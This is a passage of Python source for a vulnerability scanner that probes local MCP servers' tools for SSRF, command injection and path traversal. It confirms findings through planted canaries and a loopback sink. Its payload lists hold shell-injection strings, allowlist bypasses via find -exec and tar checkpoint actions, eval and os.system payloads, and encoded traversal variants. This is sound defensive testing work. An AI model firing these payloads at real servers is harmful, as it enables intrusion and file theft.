"""Implementation-bug probes (v2) — the hunt win-rate engine (Family A).

Actively tests a target MCP server's own tools for the server-side flaws that produce real
GHSAs (the class behind ssh-mcp / mcp-shell-server / cli-mcp-server):

    ssrf               a tool fetches an attacker-supplied URL, reaching internal targets
    command_injection  a tool's arg reaches a shell — incl. ALLOWLIST BYPASS via carrier
                       binaries (find -exec, tar --checkpoint) and NETWORK-confirmed exec
                       (curl to our sink, so exec is proven even with a read-only fs)
    path_traversal     a read tool escapes its root, OR a write tool writes outside it

Every probe is AGENT-INDEPENDENT and confirms by GROUND TRUTH, never by guessing from the
schema — SSRF by a hit on a loopback sink we own, injection by a sentinel file only a shell
could create (or a sink hit), traversal by a planted canary coming back or a marker file
appearing outside the root. No live agent, no spend. Safe: only our own loopback sink /
temp files / planted canary are ever touched, and we detect by OUR markers, so a real
file's contents never enter a result.

    python -m hunt.probes --selftest                      # fire on vuln fixture, quiet on safe
    python -m hunt.probes --target-stdio "npx some-mcp"   # probe a real local server

Guardrail: local, open-source servers only (see the mcp-hunt skill). Never point this at a
hosted endpoint you do not own.
"""
from __future__ import annotations

import argparse
import asyncio
import http.server
import json
import os
import re
import shutil
import socketserver
import sys
import tempfile
import threading
import uuid
from dataclasses import dataclass, field
from pathlib import Path

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

from hunt.lure_text import RULE_WHY, non_string_type, scan_argument_name, scan_argument_text, scan_text

VULNERABLE, SUSPECTED, CLEAN, INCONCLUSIVE, NOT_APPLICABLE = (
    "VULNERABLE", "SUSPECTED", "CLEAN", "INCONCLUSIVE", "NOT_APPLICABLE")

# The honesty spine: a verdict is DERIVED from HOW we reached it (confirmation_method), never set by a
# probe directly — so "how sure are we" and "what do we claim" can never drift apart. verdict_for() is
# the SOLE verdict source. PROOF (a planted oracle fired, or a causal effect shown against a baseline)
# is the ONLY path to VULNERABLE; response-pattern / static / observed-change inference is SUSPECTED
# (a lead, not a finding); a blocked test is INCONCLUSIVE (never silently CLEAN).
_METHOD_VERDICT = {
    "oracle":          VULNERABLE,      # a per-run planted marker/canary/sink/eval-product fired
    "differential":    VULNERABLE,      # effect demonstrated against a without-payload baseline
    "signature":       SUSPECTED,       # response-pattern inference only (e.g. a SQL parser error)
    "static":          SUSPECTED,       # structural scan (e.g. concealed metadata) — intent inferred
    "observed_change": SUSPECTED,       # in-session tool-def mutation — can't prove it's malicious
    "oracle_negative": CLEAN,           # the oracle ran and nothing fired
    "refusal":         CLEAN,           # the server deliberately refused / validated (control works)
    "by_design":       CLEAN,           # a dedicated tool did its advertised job (not a finding)
    "error":           INCONCLUSIVE,    # the call / transport failed — the test could not be run
    "not_applicable":  NOT_APPLICABLE,  # no candidate tool/param, or nothing to test
}


def verdict_for(method: str) -> str:
    """The SOLE verdict source. A probe reports confirmation_method; the verdict follows from this map.
    An unknown method raises (caught by the selfcheck) — a probe may never invent a verdict."""
    return _METHOD_VERDICT[method]


@dataclass
class ProbeResult:
    probe: str
    tool: str
    confirmation_method: str            # HOW the conclusion was reached — the single input to verdict
    marker: str = ""
    evidence: str = ""
    rationale: str = ""
    verdict: str = field(init=False)    # DERIVED only; a probe cannot pass it (structural single-source)

    def __post_init__(self):
        self.verdict = verdict_for(self.confirmation_method)


_REFUSAL = re.compile(
    r"security violation|not in allowed list|not allowed|outside allowed roots|permission denied|"
    r"forbidden|unauthori[sz]ed|access denied|not permitted|disallowed|policy (violation|denied)|"
    r"\b40[13]\b|validation (failed|error)|\brefus(e|ed|al)", re.I)


def _is_refusal(text: str) -> bool:
    """STRICT: only a recognized, deliberate server deny counts as a refusal (evidence the control
    works -> CLEAN). A generic/opaque exception is NEVER a refusal (-> INCONCLUSIVE)."""
    return bool(_REFUSAL.search(text or ""))


def _negative_method(returned_texts: list[str], raised_msgs: list[str]) -> str:
    """confirmation_method for a result where NO oracle fired. CLEAN requires positive evidence the
    oracle actually ran (a genuine non-refusal response) or that the server refused; if every attempt
    was blocked by an unrecognized failure, the class is INCONCLUSIVE, never a silent CLEAN."""
    if any(not _is_refusal(t) for t in returned_texts):
        return "oracle_negative"                    # a real response came back and nothing fired
    if returned_texts or any(_is_refusal(m) for m in raised_msgs):
        return "refusal"                            # the only responses/exceptions were recognized denies
    return "error"                                  # only unrecognized failures — the test could not run


# ---- candidate heuristics --------------------------------------------------------------
_URL_PARAM = re.compile(r"url|uri|endpoint|link|webhook|host|address|target|src|href|site|page", re.I)
_CMD_PARAM = re.compile(r"cmd|command|arg|exec|run|shell|script|action|task|process", re.I)
_PATH_PARAM = re.compile(r"path|file|dir|filename|location|doc|document", re.I)
_CONTENT_PARAM = re.compile(r"content|data|text|body|value|source", re.I)
_FETCH_DESC = re.compile(r"fetch|http|request|download|url|web|crawl|scrape|curl", re.I)
# A tool whose STATED PURPOSE is general outbound HTTP: reaching any URL (incl. loopback) is
# by-design, NOT a vuln. SSRF is a finding only when a tool that is NOT a general fetcher can
# be steered to internal hosts. This gate prevents false positives on curl/fetch tools.
_DEDICATED_FETCH = re.compile(
    r"\bcurl\b|http request|https request|fetch\w* (a |an |the )?url|fetch\w* (the )?contents|"
    r"web request|make .{0,12}request|download\w* (a |the )?file|\bscrape\b|web ?search", re.I)
# A tool whose NAME is itself a general fetcher (fetch, curl, http_get, download, scrape, …):
# reaching any URL is its purpose, so it is by-design, not SSRF. (Catches e.g. mcp-server-fetch,
# whose tool is literally named `fetch` — a bare name _DEDICATED_FETCH's phrase patterns miss.)
_FETCH_NAME = re.compile(
    r"\b(fetch|curl|wget|download|scrape|crawl|http_?get|get_?url|open_?url|"
    r"web_?(fetch|get|search|request)|url_?(fetch|get))\b", re.I)
_CMD_DESC = re.compile(r"\brun\b|execute|shell|command|exec|spawn|subprocess|process", re.I)
_READ_DESC = re.compile(r"read|open|file|path|document|load|\bcat\b|contents", re.I)
_WRITE_DESC = re.compile(r"write|create|save|edit|append|\bput\b|modify", re.I)
_SQL_PARAM = re.compile(r"query|sql|statement|term|filter|search|keyword|\bid\b|title|name|where|column|table", re.I)
_DESER_PARAM = re.compile(r"yaml|yml|pickle|serial|deserial|payload|config|marshal|\bdata\b|\bobj\b|dump", re.I)
_DESER_DESC = re.compile(r"yaml|yml|pickle|deserial|serial|unmarshal|\bload\b|config|parse", re.I)
_SQL_DESC = re.compile(r"\bsql\b|database|\bdb\b|query|select|record|table|sqlite|postgres|mysql|search", re.I)
# SQL-parser error signatures across common engines (error-based SQLi ground truth).
# A tool whose STATED PURPOSE is running arbitrary commands/code/SQL: executing our payload is
# by-design, not a vuln. The real finding is a tool that CLAIMS to restrict (and is bypassed),
# or a non-executor tool that unexpectedly executes.
_EXEC_GENERAL = re.compile(
    r"run (a |an )?[\w ]{0,24}command|execute [\w ]{0,24}command|execute .{0,20}code|"
    r"run .{0,20}script|shell command|run (a )?shell|arbitrary (command|code)", re.I)
_CLAIMS_RESTRICTION = re.compile(
    r"allow ?list|allow-list|white ?list|allowed (command|path|dir|executable)|restrict|sandbox|"
    r"secure mode|security constraint|configurable security|safe mode|validated command", re.I)
# NOTE: bare "safe"/"validated"/"secure" are deliberately excluded — they appear in benign executor
# descriptions ("safely run commands", "validated input") and would mis-class a by-design executor as a
# bypassed restriction. Only a SPECIFIC restriction claim (allowlist / secure mode / security constraint
# / sandbox) means "this tool advertises a boundary", so executing arbitrary code is a BYPASS, not by-design.
_SQL_EXEC = re.compile(
    r"execute .{0,20}sql|run .{0,20}sql|data modification sql|\bddl\b|arbitrary sql|"
    r"execute (a |an )?query|write query|run (a |an )?query", re.I)
_SQL_ERR = re.compile(
    r"sqlite3?\.|OperationalError|ProgrammingError|IntegrityError|syntax error|unrecognized token|"
    r"unterminated|SQLSTATE|psycopg|MySQL|SQL logic error|near \"|no such column|quoted string",
    re.I)
# A full-text (FTS5) MATCH syntax error on a BOUND parameter is NOT injection — it's a malformed
# search query, expected for any search tool. Exclude it to avoid false positives.
_SQL_FALSE = re.compile(r"fts5|full[- ]?text|\bMATCH\b|fts: ", re.I)


def _schema(tool) -> dict:
    # SDK-agnostic: the MCP Python SDK renamed Tool.inputSchema -> input_schema in 2.x.
    # Read whichever the installed SDK exposes so a version bump never crashes the scan.
    s = getattr(tool, "input_schema", None)
    if not isinstance(s, dict):
        s = getattr(tool, "inputSchema", None)
    return s if isinstance(s, dict) else {}


def _str_params(tool) -> list[str]:
    props = _schema(tool).get("properties", {}) or {}
    return [n for n, s in props.items() if (s or {}).get("type", "string") == "string"]


def _ptype(tool, name: str) -> str:
    return (_schema(tool).get("properties", {}).get(name, {}) or {}).get("type", "string")


def _matching_params(tool, param_re) -> list[str]:
    return [p for p in _str_params(tool) if param_re.search(p)]


def _candidate_params(tool, param_re, desc_re, fallback) -> list[str]:
    """String params worth injecting into for this flaw.

    From the declared schema when it has params; otherwise (a server that under-declares its
    inputSchema — common in the wild) fall back to the category's conventional param names,
    but only when the tool's name/description fits the category, so we don't blind-probe
    everything.
    """
    params = _str_params(tool)
    if params:
        named = [p for p in params if param_re.search(p)]
        if named:
            return named
        return params[:2] if desc_re.search(tool.description or "") else []
    if desc_re.search((tool.description or "") + " " + tool.name):   # empty schema, name/desc fits
        return fallback
    return []


def _build_args(tool, overrides: dict) -> dict:
    """Satisfy required params with type-correct dummies, then apply overrides."""
    props = _schema(tool).get("properties", {}) or {}
    required = set(_schema(tool).get("required", list(props))) | set(overrides)
    args: dict = {}
    for n in required:
        if n in overrides:
            args[n] = overrides[n]
            continue
        t = (props.get(n, {}) or {}).get("type", "string")
        args[n] = {"integer": 1, "number": 1, "boolean": False, "array": [], "object": {}}.get(t, "x")
    return args


def _inject(tool, param: str, payload: str):
    """Wrap the payload for the param's type (array params take a one-element list)."""
    return [payload] if _ptype(tool, param) == "array" else payload


def _result_text(result) -> str:
    return "\n".join(getattr(c, "text", "") or "" for c in (getattr(result, "content", []) or []))


# A tool call that fails for lack of credentials must NOT be scored CLEAN — it was never tested. This
# recognises the common auth/permission failures so the scan can say "requires credentials" honestly.
_AUTH_ERR = re.compile(
    r"\b(401|403)\b|unauthor|forbidden|not authenticated|authentication (failed|required)|"
    r"\b(invalid|missing|expired|no) (api[ _-]?key|token|credential|auth)|permission denied|"
    r"access denied|must (log ?in|authenticate)|\bNOAUTH\b|credentials? (required|not|missing)", re.I)


def is_auth_error(text: str) -> bool:
    """True if a tool result / error looks like an auth or credential failure (not a clean verdict)."""
    return bool(text and _AUTH_ERR.search(text))


class _Sink:
    """Loopback HTTP server recording every request path. Ground truth for SSRF + curl exec."""

    def __init__(self):
        self.hits: list[str] = []
        self._httpd = None
        self.port = None

    def start(self) -> "_Sink":
        hits = self.hits

        class H(http.server.BaseHTTPRequestHandler):
            def _rec(self):
                hits.append(self.path)
                # a redirect path lets us detect servers that follow 3xx (SSRF via redirect)
                if self.path.startswith("/redir-"):
                    self.send_response(302)
                    self.send_header("Location", self.path.replace("/redir-", "/followed-"))
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()
            do_GET = do_POST = do_PUT = _rec

            def log_message(self, *a):
                pass

        self._httpd = socketserver.TCPServer(("127.0.0.1", 0), H)
        self.port = self._httpd.server_address[1]
        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()
        return self

    def hit(self, marker: str) -> bool:
        return any(marker in h for h in self.hits)

    def stop(self):
        if self._httpd:
            self._httpd.shutdown()
            self._httpd.server_close()


# ---- probes ----------------------------------------------------------------------------
async def probe_ssrf(session, tools) -> list[ProbeResult]:
    out = []
    sink = _Sink().start()
    try:
        for tool in tools:
            params = _candidate_params(tool, _URL_PARAM, _FETCH_DESC, ["url", "uri", "href", "endpoint"])
            if not params:
                continue
            marker = "ssrf-" + uuid.uuid4().hex[:10]
            direct = f"http://127.0.0.1:{sink.port}/{marker}"
            redir = f"http://127.0.0.1:{sink.port}/redir-{marker}"
            returned, raised = [], []
            for param in params:
                for url in (direct, redir):
                    try:
                        r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, url)}))
                        returned.append(_result_text(r))
                    except Exception as exc:  # noqa: BLE001
                        raised.append(str(exc))
            await asyncio.sleep(0.3)
            reached = sink.hit(marker)
            if not reached:
                out.append(ProbeResult("ssrf", tool.name, _negative_method(returned, raised), marker=marker,
                                       rationale="did not fetch the loopback URL"))
                continue
            desc = (tool.description or "") + " " + tool.name
            dedicated = bool(_DEDICATED_FETCH.search(desc) or _FETCH_NAME.search(tool.name))
            follows = sink.hit(f"followed-{marker}")
            if dedicated:   # a general fetch/curl tool reaching a URL is its stated job — not a vuln
                out.append(ProbeResult("ssrf", tool.name, "by_design", marker=marker,
                                       evidence=f"{tool.name} -> loopback sink",
                                       rationale="dedicated fetch/curl tool reached internal/loopback — "
                                                 "by-design capability (informational: no SSRF egress "
                                                 "filtering), not a finding"))
            else:           # a tool NOT meant as a general fetcher made an outbound request -> SSRF
                out.append(ProbeResult("ssrf", tool.name, "oracle", marker=marker,
                                       evidence=f"{tool.name} -> loopback sink",
                                       rationale="a non-fetch tool was steered to request an "
                                                 "attacker-controlled host, reaching loopback/internal"
                                                 + (" ; follows 3xx redirects" if follows else "")))
    finally:
        sink.stop()
    return out


def _interp_carriers(nonce: str) -> list:
    """`<allowed-interpreter> -c <NONCE>` carriers — the CVE-2026-55581/55582 allowlist-bypass shape the
    old payload set missed. NONCE is a single alphanumeric token (no metacharacters, so it survives a
    `$ ( ) { } ; |`-style blocklist AND a naive argv split); the interpreter tries to RUN it as a command
    and echoes it back INSIDE ITS OWN error — proof of execution via the tool's RETURNED output.

    Each entry is (payload, oracle_regex). The oracle matches the INTERPRETER's error/output signature
    wrapping the nonce, NOT a bare reflection: a server that rejects and echoes the payload ("denied:
    bash -c <nonce>") never produces `<nonce>: command not found`, so it cannot false-positive."""
    n = re.escape(nonce)
    sh_sig = re.compile(rf"{n}: (command )?not found", re.I)                  # bash/sh: '<nonce>: command not found'
    py_sig = re.compile(rf"name ['\"]?{n}['\"]? is not defined", re.I)        # python NameError
    node_sig = re.compile(rf"\b{n} is not defined", re.I)                     # node ReferenceError
    ruby_sig = re.compile(rf"undefined .{{0,40}}{n}", re.I)                    # ruby NameError
    nonce_alone = re.compile(rf"(?m)^\s*{n}\s*$")                             # echo output: the nonce ALONE on a line
    tag = nonce[:5]
    out = [(f"{b} -c {nonce}", sh_sig) for b in ("/bin/bash", "bash", "/bin/sh", "sh")]
    out += [(f"{p} -c {nonce}", py_sig) for p in ("/usr/bin/python3", "python3")]
    out += [(f"{nd} -e {nonce}", node_sig) for nd in ("node", "/usr/bin/node")]
    out += [(f"ruby -e {nonce}", ruby_sig)]
    out += [(f"{g} -c alias.{tag}=!{nonce} {tag}", sh_sig) for g in ("git", "/usr/bin/git")]  # git `!`-alias shell
    # metachar-bypass + stdout nonce (servers that allow $ but filter spaces): echo the nonce alone
    out += [(f"{b} -c echo${{IFS}}{nonce}", nonce_alone) for b in ("/bin/bash", "bash", "sh")]
    return out


async def probe_command_injection(session, tools) -> list[ProbeResult]:
    out = []
    d = Path(tempfile.mkdtemp(prefix="probe_cmd_"))
    sink = _Sink().start()
    try:
        for tool in tools:
            params = _candidate_params(tool, _CMD_PARAM, _CMD_DESC, ["command", "cmd", "args", "script"])
            if not params:
                continue
            fired, used = False, ""
            returned, raised = [], []
            for param in params:
                sentinel = d / ("s_" + uuid.uuid4().hex[:10])
                cmarker = "cmd-" + uuid.uuid4().hex[:10]
                icnonce = "IC" + uuid.uuid4().hex[:12]     # single alphanumeric token -> survives metachar filters
                sink_url = f"http://127.0.0.1:{sink.port}/{cmarker}"
                # (payload, oracle_regex): None -> confirmed by the planted sentinel file / loopback sink;
                # a regex -> confirmed by the INTERPRETER's own error/output wrapping our nonce in the tool's
                # RETURNED text (the server-2 FN root cause: the old oracle ignored returned output).
                payloads = [(p, None) for p in (
                    f"x; touch {sentinel}", f"x && touch {sentinel}", f"x | touch {sentinel}",
                    f"$(touch {sentinel})", f"`touch {sentinel}`", f"x\ntouch {sentinel}",
                    f"'; touch {sentinel} #", f'"; touch {sentinel} #',
                    # allowlist bypass via carrier binaries whose own flags exec a command:
                    f"find . -maxdepth 0 -exec touch {sentinel} {{}} +",
                    f"find . -maxdepth 0 -exec touch {sentinel} \\;",
                    f"tar cf /dev/null --checkpoint=1 --checkpoint-action=exec=touch {sentinel} .",
                    # network-confirmed exec (works even with a read-only fs):
                    f"x; curl -s {sink_url}", f"$(curl -s {sink_url})", f"`curl -s {sink_url}`",
                    # code/eval injection for code-exec servers (python / node):
                    f"__import__('os').system('touch {sentinel}')",
                    f"eval(\"__import__('os').system('touch {sentinel}')\")",
                    f"require('child_process').execSync('touch {sentinel}')",
                )] + _interp_carriers(icnonce)          # <allowed-interpreter> -c <nonce>, returned-text oracle
                for p, oracle_re in payloads:
                    try:
                        r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                        text = _result_text(r)
                        returned.append(text)
                    except Exception as exc:  # noqa: BLE001
                        text = str(exc)
                        raised.append(text)
                    await asyncio.sleep(0.05)
                    # interpreter-carrier: require the interpreter's OWN error/output signature around the
                    # nonce (anti-reflection) AND that the response isn't a deliberate refusal.
                    oracle_hit = bool(oracle_re) and not _is_refusal(text) and bool(oracle_re.search(text))
                    if sentinel.exists() or sink.hit(cmarker) or oracle_hit:
                        fired, used = True, p
                        break
                if fired:
                    break
            if not fired:
                out.append(ProbeResult("command_injection", tool.name, _negative_method(returned, raised),
                                       evidence=used, rationale="no payload achieved command execution"))
                continue
            desc = (tool.description or "") + " " + tool.name
            if _CLAIMS_RESTRICTION.search(desc):
                method, why = "oracle", ("a tool that advertises a command restriction (allowlist / secure "
                                         "mode / sandbox) executed injected code — the restriction is bypassable")
            elif _EXEC_GENERAL.search(desc):
                method, why = "by_design", ("general command/code-execution tool ran the command — "
                                            "by-design (informational: unrestricted execution), not a finding")
            else:
                method, why = "oracle", ("a tool not advertised as a command executor ran an "
                                         "injected command")
            out.append(ProbeResult("command_injection", tool.name, method, evidence=used, rationale=why))
    finally:
        sink.stop()
        shutil.rmtree(d, ignore_errors=True)
    return out


def _under(path: str, root: str) -> bool:
    """True iff `path` is `root` or lies within it (proper separator boundary — no prefix trap)."""
    try:
        p, r = os.path.realpath(path), os.path.realpath(root)
    except Exception:  # noqa: BLE001
        return False
    return p == r or p.startswith(r.rstrip(os.sep) + os.sep)


def _resolve_real_dir(p: str):
    """Reconcile a server-reported dir with the real filesystem: some servers advertise a NORMALISED
    root (e.g. case-folded — which is itself the CVE-2025-53110 case-bypass tell) that fails a literal
    isdir() on a case-sensitive FS. Walk the path components case-insensitively to recover the real
    on-disk dir. Returns the real path or None. Dynamic — no server/path hardcoding."""
    if os.path.isdir(p):
        return p
    parts = Path(p).parts
    if not parts or parts[0] != os.sep:
        return None
    cur = os.sep
    for comp in parts[1:]:
        direct = os.path.join(cur, comp)
        if os.path.isdir(direct):
            cur = direct
            continue
        try:                                   # case-insensitive match among the real siblings
            match = next((e for e in os.listdir(cur) if e.lower() == comp.lower()), None)
        except OSError:
            return None
        if not match:
            return None
        cur = os.path.join(cur, match)
    return cur if os.path.isdir(cur) else None


async def _allowed_roots(session, tools) -> list[str]:
    """The server's advertised allowed directories (e.g. filesystem servers' list_allowed_directories),
    so the traversal canary can be planted OUTSIDE them. [] if the server doesn't advertise any."""
    # Match the NAME only — many tools mention "allowed directories" in their DESCRIPTION
    # (read_file etc.), which would mis-select the wrong tool.
    t = next((t for t in tools if re.search(r"allowed.*dir|list[_-]?allowed", t.name, re.I)), None)
    if not t:
        return []
    try:
        text = _result_text(await session.call_tool(t.name, _build_args(t, {})))
    except Exception:  # noqa: BLE001
        return []
    roots: list[str] = []
    for p in re.findall(r"(/[^\s,:'\"]+)", text):
        rp = _resolve_real_dir(p)
        if rp and rp not in roots:
            roots.append(rp)
    return roots


def _outside_root_dir(roots: list[str]):
    """A fresh temp dir guaranteed to sit OUTSIDE every root; None if the roots cover all candidates."""
    for base in ("/tmp", "/var/tmp", "/dev/shm", str(Path.home()), tempfile.gettempdir()):
        if os.path.isdir(base) and not any(_under(base, r) for r in roots):
            try:
                return Path(tempfile.mkdtemp(prefix="probe_pt_", dir=base))
            except Exception:  # noqa: BLE001
                continue
    return None


# ---- path-traversal variant coverage (CWE-22/23) + adjacent / in-root plants -----------------------
# A new server is DATA, not code: payloads + oracle are derived from the server's advertised root(s)
# and tool/param surface at runtime — no hardcoded tool/server/param names. A (sibling-prefix) writes
# a cleaned-up canary in the root's PARENT (outside the managed area) → default-on, gated only by a
# writable parent. B (in-root symlink) mutates the server's own managed root → OPT-IN, default off.
_ALLOW_WRITE_INTO_ROOT = os.environ.get("MCPRT_ALLOW_WRITE_INTO_ROOT", "") == "1"
_OUTPUT_DESC = re.compile(r"screenshot|screen[-_ ]?shot|\bpdf\b|snapshot|\bsave\b|export|download|"
                          r"capture|dump|\brender\b", re.I)
_OUTPUT_PARAM = re.compile(r"filename|file|path|out(put)?|dest(ination)?|save|target|to", re.I)


def _traversal_variants(canary, marker: str) -> list:
    """The CWE-22/23 read-escape variant space — every entry targets OUR out-of-root canary (planted in
    our own temp, non-invasive). (payload, expected_marker, label). Covers the CLASS, not an instance:
    a server that normalises/decodes any of these is caught with zero per-server code."""
    a = str(canary)
    rel = "../" * 20 + a.lstrip(os.sep)
    return [
        (a, marker, "plain-absolute-outside"),
        (rel, marker, "dotdot-outside"),
        (a.replace("/", "\\"), marker, "backslash-separator"),
        (rel.replace("../", "%2e%2e%2f"), marker, "url-encoded"),
        (rel.replace("../", "%252e%252e%252f"), marker, "double-url-encoded"),
        (rel.replace("../", "....//"), marker, "nested-dotdot (single-strip bypass)"),
        (rel.replace("/", "%2f"), marker, "encoded-separator"),
        (a + "%00.txt", marker, "null-byte-truncation"),
        ("\\\\?\\" + a.replace("/", "\\"), marker, "windows-unc"),
    ]


def _plant_sibling(root: str, cleanups: list):
    """Plant a canary at `<root>_pt_<rand>/canary.txt` — a SIBLING that shares the root's string prefix
    but lies OUTSIDE it (the CVE-2025-53110 bypass shape). Writes in the root's PARENT (not the managed
    root) → default-on, gated only by a writable parent + guaranteed cleanup. Returns (payload, marker)
    or None (→ caller marks the vector NOT_APPLICABLE, never CLEAN)."""
    base = str(root).rstrip(os.sep)
    parent = os.path.dirname(base)
    if not base or not parent or not (os.path.isdir(parent) and os.access(parent, os.W_OK)):
        return None
    sib = Path(base + "_pt_" + uuid.uuid4().hex[:8])
    cleanups.append(lambda: shutil.rmtree(sib, ignore_errors=True))     # register BEFORE create (always cleaned)
    try:
        sib.mkdir()
        mk = "PTA-" + uuid.uuid4().hex[:12]
        (sib / "canary.txt").write_text(mk)
        return str(sib / "canary.txt"), mk
    except Exception:  # noqa: BLE001
        return None


def _plant_symlink(root: str, cleanups: list):
    """Create `<root>/pt_link_<rand>` → a SIBLING-PREFIX canary just outside the root (CVE-2025-53109).
    Pointing at a sibling-prefix target (not a plain-outside one) makes BOTH symlink-follow flavours
    fire: a server that follows the link with no realpath re-check, AND one that re-checks realpath with
    a prefix (no-separator) test — while a separator-aware server still denies it. Mutates the target's
    own managed root → OPT-IN (allow_write_into_root), default off; safe-by-construction + guaranteed
    cleanup. Returns (link_path, marker) or None (→ vector NOT_APPLICABLE)."""
    if not _ALLOW_WRITE_INTO_ROOT:
        return None
    rp = str(root).rstrip(os.sep)
    parent = os.path.dirname(rp)
    if not (os.path.isdir(rp) and os.access(rp, os.W_OK) and parent and os.access(parent, os.W_OK)):
        return None
    tgt_dir = Path(rp + "_ptl_" + uuid.uuid4().hex[:8])        # sibling of root (shares prefix, outside it)
    link = Path(rp) / ("pt_link_" + uuid.uuid4().hex[:8])
    cleanups.append(lambda: shutil.rmtree(tgt_dir, ignore_errors=True))   # register BEFORE create
    cleanups.append(lambda: link.unlink(missing_ok=True))
    try:
        tgt_dir.mkdir()
        mk = "PTB-" + uuid.uuid4().hex[:12]
        (tgt_dir / "canary.txt").write_text(mk)
        os.symlink(str(tgt_dir / "canary.txt"), str(link))
        return (str(link), mk) if link.is_symlink() else None
    except Exception:  # noqa: BLE001
        return None


def _output_file_params(tool):
    """A tool that writes a file whose CONTENT it generates internally (screenshot/pdf/snapshot): a
    filename/path param but NO caller-supplied content param. Returns that param or None — derived from
    the advertised schema/description, no hardcoded names."""
    if _writer_params(tool):                 # path+content writer -> handled by the write branch
        return None
    desc = (tool.description or "") + " " + tool.name
    if not _OUTPUT_DESC.search(desc):
        return None
    for p in _schema(tool).get("properties", {}):
        if _OUTPUT_PARAM.search(p):
            return p
    return None


async def probe_path_traversal(session, tools) -> list[ProbeResult]:
    out = []
    roots = await _allowed_roots(session, tools)   # the server's managed root(s); escapes target OUTSIDE them
    if roots:
        d = _outside_root_dir(roots)
        if d is None:   # root covers every candidate (e.g. '/') — no out-of-root path exists to test
            for tool in tools:
                if (_writer_params(tool) or _output_file_params(tool)
                        or _candidate_params(tool, _PATH_PARAM, _READ_DESC,
                                             ["path", "file", "filepath", "filename"])):
                    out.append(ProbeResult("path_traversal", tool.name, "not_applicable",
                        rationale="server's allowed root spans all candidate locations — no out-of-root "
                                  "path exists to test traversal (not a finding)"))
            return out
    else:
        d = Path(tempfile.mkdtemp(prefix="probe_pt_"))
    marker = "PT-" + uuid.uuid4().hex[:12]
    canary = d / "canary.txt"
    canary.write_text(marker)
    cleanups: list = []
    # Read-escape payloads: the full CWE-22/23 variant space, all targeting our out-of-root canary.
    read_payloads = _traversal_variants(canary, marker)
    # Adjacent (A, sibling-prefix: default-on) + in-root (B, symlink: opt-in) plants, per advertised root.
    sibling_planted = symlink_planted = False
    for root in (roots or []):
        sp = _plant_sibling(root, cleanups)
        if sp:
            read_payloads.append((sp[0], sp[1], "sibling-prefix (CVE-2025-53110)"))
            sibling_planted = True
        lk = _plant_symlink(root, cleanups)
        if lk:
            read_payloads.append((lk[0], lk[1], "symlink (CVE-2025-53109)"))
            symlink_planted = True
    had_reader = False
    try:
        for tool in tools:
            writer = _writer_params(tool)
            if writer:                                   # arbitrary-write escape (path + caller content)
                path_p, content_p = writer
                wmark = "PW-" + uuid.uuid4().hex[:12]
                target = d / f"escaped_{wmark}.txt"       # outside any server root
                returned, raised = [], []
                try:
                    r = await session.call_tool(tool.name, _build_args(
                        tool, {path_p: str(target), content_p: wmark}))
                    returned.append(_result_text(r))
                except Exception as exc:  # noqa: BLE001
                    raised.append(str(exc))
                await asyncio.sleep(0.1)
                wrote = target.exists() and wmark in target.read_text(errors="replace")
                out.append(ProbeResult("path_traversal", tool.name,
                                       "oracle" if wrote else _negative_method(returned, raised),
                                       marker=wmark, evidence=f"{tool.name}(write outside root)",
                                       rationale=("wrote a file outside its root (arbitrary write)"
                                                  if wrote else "write confined to root")))
                continue
            op = _output_file_params(tool)
            if op:                                        # output-file tool (content generated internally)
                omark = "PTC-" + uuid.uuid4().hex[:10]
                out_file = d / f"escaped_{omark}.out"     # in OUR out-of-root temp — we can stat it
                returned, raised, how = [], [], ""
                for t, lbl in ((str(out_file), "absolute-out-of-root"),
                               ("../" * 20 + str(out_file).lstrip(os.sep), "dotdot-out-of-root")):
                    try:
                        r = await session.call_tool(tool.name, _build_args(tool, {op: _inject(tool, op, t)}))
                        returned.append(_result_text(r))
                    except Exception as exc:  # noqa: BLE001
                        raised.append(str(exc))
                    await asyncio.sleep(0.1)
                    if out_file.exists():                 # OUR uniquely-named file landed outside -> escape
                        how = lbl
                        break
                out.append(ProbeResult("path_traversal", tool.name,
                    "oracle" if how else _negative_method(returned, raised), marker=omark,
                    evidence=(how or f"{tool.name}(output-dir escape)"),
                    rationale=(f"output-file tool wrote OUR file outside its output directory via {how} "
                               "(write-escape)" if how else "output path confined to the output directory")))
                try:
                    out_file.unlink()
                except Exception:  # noqa: BLE001
                    pass
                continue
            params = _candidate_params(tool, _PATH_PARAM, _READ_DESC, ["path", "file", "filepath", "filename"])
            if not params:
                continue
            had_reader = True
            fired, used, how = False, "", ""
            returned, raised = [], []
            for param in params:
                for p, expect, label in read_payloads:
                    try:
                        r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                        txt = _result_text(r)
                        returned.append(txt)
                    except Exception as exc:  # noqa: BLE001
                        txt = ""
                        raised.append(str(exc))
                    if expect and expect in txt:          # only OUR planted marker counts
                        fired, used, how = True, p, label
                        break
                if fired:
                    break
            out.append(ProbeResult("path_traversal", tool.name,
                                   "oracle" if fired else _negative_method(returned, raised), marker=marker,
                                   evidence=used,
                                   rationale=(f"returned an out-of-root canary via {how} (planted canary "
                                              "leaked)" if fired else "did not return the out-of-root canary")))
        # Honest NOT_APPLICABLE (never a silent CLEAN) for adjacent vectors we could not actually test.
        if had_reader and not sibling_planted:
            why = ("server's allowed root could not be determined at runtime" if not roots
                   else "the server-root's parent is not writable (cannot plant the sibling canary)")
            out.append(ProbeResult("path_traversal", "(sibling-prefix vector)", "not_applicable",
                                   rationale="CVE-2025-53110 sibling-prefix NOT tested: " + why))
        if had_reader and not symlink_planted:
            why = ("in-root symlink is opt-in — set MCPRT_ALLOW_WRITE_INTO_ROOT=1 on a server you own"
                   if not _ALLOW_WRITE_INTO_ROOT else
                   ("server's allowed root could not be determined at runtime" if not roots
                    else "the server root is not writable (cannot plant the in-root symlink)"))
            out.append(ProbeResult("path_traversal", "(symlink vector)", "not_applicable",
                                   rationale="CVE-2025-53109 in-root symlink NOT tested: " + why))
    finally:
        for c in cleanups:
            try:
                c()
            except Exception:  # noqa: BLE001
                pass
        shutil.rmtree(d, ignore_errors=True)
    return out


def _writer_params(tool):
    """Return (path_param, content_param) if the tool looks like it writes a file, else None."""
    looks_write = _WRITE_DESC.search((tool.description or "") + " " + tool.name)
    if not looks_write:
        return None
